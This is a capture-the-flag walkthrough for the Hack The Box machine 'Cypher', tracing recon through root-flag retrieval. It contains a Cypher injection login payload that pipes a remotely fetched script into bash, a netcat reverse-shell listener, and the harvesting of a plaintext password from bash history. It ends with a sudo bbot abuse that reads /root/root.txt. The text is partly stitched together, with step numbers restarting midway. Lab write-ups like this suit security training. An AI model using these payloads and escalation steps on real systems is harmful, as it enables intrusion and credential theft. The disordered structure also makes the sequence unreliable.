# HTB Walkthrough: **Cypher** — From Web Recon to Root Resistance!

## Step 1: Initial Nmap Reconnaissance

We begin with the **almighty port scan** to see what this mystery box has to offer!

```bash
nmap -sV -sC 10.129.171.46
```

### Output:
```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

Only **TCP 22** (SSH) and **TCP 80** (HTTP) are exposed; continue with web enumeration on port 80.

---

## Step 2: Hostname Discovery & `/etc/hosts` Mapping

We noticed from the HTTP headers that the site **wants to redirect to a hostname!**

```bash
echo "10.129.171.46   cypher.htb" | sudo tee -a /etc/hosts
```

 Now we can access the site properly via `http://cypher.htb`

---

## Step 3: Directory Busting with Dirsearch

Brute-force web paths to discover hidden endpoints and assets.

```bash
dirsearch -u 'http://cypher.htb/' -x 404
```

### Discovered paths:
- `/about` 
- `/about.html` 
- `/api` → 307 redirect to `/api/docs`
- `/demo` → redirect to `/login`
- `/login` 
- `/testing` → 301 redirect to `/testing/`

**Looks like a proper frontend — maybe something custom built. Let’s investigate further...**

---

## Step 4: Inspecting Login Behavior

Through browser inspection and some traffic analysis, we identified the **authentication endpoint**:

```http
POST /api/auth HTTP/1.1
```

Using this knowledge, we crafted a **Cypher Injection payload** to abuse Neo4j's graph query engine behind the scenes!

```json
{
  "username": "a' RETURN h.value as hash UNION CALL custom.getUrlStatusCode(\"http://10.10.14.16:80;curl http://10.10.14.16/bash.sh|bash;#\") YIELD statusCode RETURN statusCode AS hash;//",
  "password": "x"
}
```

That payload achieved **remote code execution** by abusing Neo4j’s `custom.getUrlStatusCode()` request handler.

---

## Step 5: Netcat Reverse Shell Catcher Setup

Start listeners for the callback and any staged download:

```bash
nc -lvnp 9001

python3 -m http.server 80


```

When the shell landed, we were **inside the box as the `neo4j` user!**

---

## Step 6: Local Enumeration as `neo4j`

Enumerate local users and home directories:

```bash
cat /etc/passwd
```

 Found:
- Users: `neo4j`, `graphasm`, and `root`!
- Home directories: `/home/neo4j/`, `/home/graphasm/`

List `/home`:

```bash
cd /home
ls -la
```

The `graphasm` home directory is present and worth inspecting.

---

## Step 7: Hash Discovery

Inside `graphasm`’s home, we discovered a **hash value** that appeared to be in a `.hash` file:

```bash
cat neo4j.hash
```

It looked like this:
```text
$neo4j$1$6a4277a...bfead7b48$3d19d683...bc13a65c
```

 That’s a **Neo4j database password hash!** Save that for cracking...

---

## Step 8: Bash History Leakage

Review shell history for credentials or unsafe commands:

```bash
cat ~/.bash_history
```


┌──(kali@kali)-[~]
└─$ nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.10.14.16] from (UNKNOWN) [10.129.231.244] 43890
bash: cannot set terminal process group (1410): Inappropriate ioctl for device
bash: no job control in this shell
neo4j@cypher:/$ cat ~/.bash_history
cat ~/.bash_history
neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK
neo4j@cypher:/$ 


**Finding:** plaintext material in history (e.g. `neo4j-admin set-initial-password …`), usable to pivot to another account.

---

## Step 9: SSH Pivot to `graphasm`

With recovered credentials, open an SSH session as `graphasm`:

```bash
ssh graphasm@10.129.171.46
```

User-level SSH access as `graphasm` is confirmed.

---

## Step 10: Sudo Privilege Check

Now that we’re `graphasm`, we check what we can do with `sudo`:

```bash
sudo -l
```

### Output:
```text
User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

`/usr/local/bin/bbot` may be executed via `sudo` **without a password** for `graphasm`; validate impact before running destructive modules.

---

## Step 11: BBOT Exploitation Begins

We ran:

```bash
bbot -help
```

Help output lists many flags and modules (including `exec.shell`-style options), but not every combination behaved as expected. Example attempts:

```bash
sudo /usr/local/bin/bbot -t localhost --modules exec.shell -c modules.exec.shell.cmd='cat /root/root.txt'
```

and

```bash
cat << EOF > /tmp/rootflag.yml
modules:
  - name: exec.shell
    type: exec
    args:
      cmd: bash -c "cat /root/root.txt"
EOF

sudo /usr/local/bin/bbot --config /tmp/rootflag.yml --output-dir /tmp/bbotroot -y --silent
```

 Unfortunately, the config syntax didn’t register! The binary may not support command execution the way we hoped.


```bash
whoami
id
```

**Expected Output:**
```bash
graphasm
uid=1001(graphasm) gid=1001(graphasm) groups=1001(graphasm)
```

Current user context: **`graphasm`**.

---

## Step 2: Check for Sudo Privileges  

Re-check `sudo` rules for `graphasm`:

```bash
sudo -l
```

**Output:**
```text
User graphasm may run the following command on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

**Finding:** `/usr/local/bin/bbot` is executable with `sudo` and **NOPASSWD**.  
`bbot` is the **BBOT** reconnaissance framework binary; it supports extensive CLI flags and YAML-driven configuration.

---

## Step 3: Explore BBOT Usage and Options

Start by reviewing help:

```bash
sudo /usr/local/bin/bbot --help
```

Key options of interest:

- `-cy <file>`: Specify a custom **YARA rules file**
- `--dry-run`: Load and configure all modules, but don’t actually run any scans

This raised a crucial thought:

>  If we can point `-cy` to **any file**, including `/root/root.txt`, and BBOT *reads and parses* it, we might exfil the flag indirectly.

---

## Step 4: Try to Read `/root/root.txt`

Run BBOT against the root flag file directly:

```bash
sudo /usr/local/bin/bbot -cy /root/root.txt --dry-run
```

 **It worked.** Part of the debug output:

```text
[DBUG] internal.excavate: Successfully loaded custom yara rules file [/root/root.txt]
[DBUG] internal.excavate: Final combined yara rule contents: 15b016478bb157c417785f454ff9394f
```

BBOT **parses the file** as a YARA rules file, even if it's just a plaintext flag!

---
